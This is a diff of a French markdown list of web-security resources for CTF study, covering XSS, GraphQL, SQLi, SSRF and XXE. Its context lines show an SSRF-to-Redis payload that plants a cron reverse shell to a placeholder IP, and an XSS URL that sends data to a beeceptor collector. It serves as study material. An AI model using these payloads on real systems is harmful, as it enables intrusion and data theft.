@@ -41,20 +41,16 @@
 
 - https://www.nzeros.me/2023/08/07/securinetsminictf2k22/
 
-*Aussi*:
-
-### XSS
-
-[Stored & Reflected XSS (hackndo)](https://beta.hackndo.com/attaque-xss/)
-https://brightsec.com/blog/xss/#xss-types
-https://blog.clever-age.com/fr/2014/02/10/owasp-xss-cross-site-scripting/
-https://excess-xss.com/
+*Aussi* (Serveur):
 
 ### GraphQL
 
  - https://www.next-decision.fr/wiki/differentes-categories-api-majeures-rest-soap-graphql
  - https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/
  - https://ivangoncharov.github.io/graphql-voyager/
+
+
+![](./api.gif)
 
 ### SQLi
   - https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
@@ -77,10 +73,19 @@ for i in {1..10000}; do curl -s -i http://site.org/index.php --data "url=http://
 dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port> 0>\x261\n\n\n"
 ```
 
+### XSS
+
+[Stored & Reflected XSS (hackndo)](https://beta.hackndo.com/attaque-xss/)
+https://brightsec.com/blog/xss/#xss-types
+https://blog.clever-age.com/fr/2014/02/10/owasp-xss-cross-site-scripting/
+https://excess-xss.com/
+
 ### XXE
   - https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
  
 --------
+
+Client
 
 ### XSS
  - https://beta.hackndo.com/attaque-xss/
@@ -106,6 +111,8 @@ https://vulnerable.org?parameter=<img src="//night.free.beeceptor.com?data=".con
 ## AST
 
 - https://seal9055.com/blog/browser/browser_architecture
+
+![](./url.png)
 
 ## Obfu
 
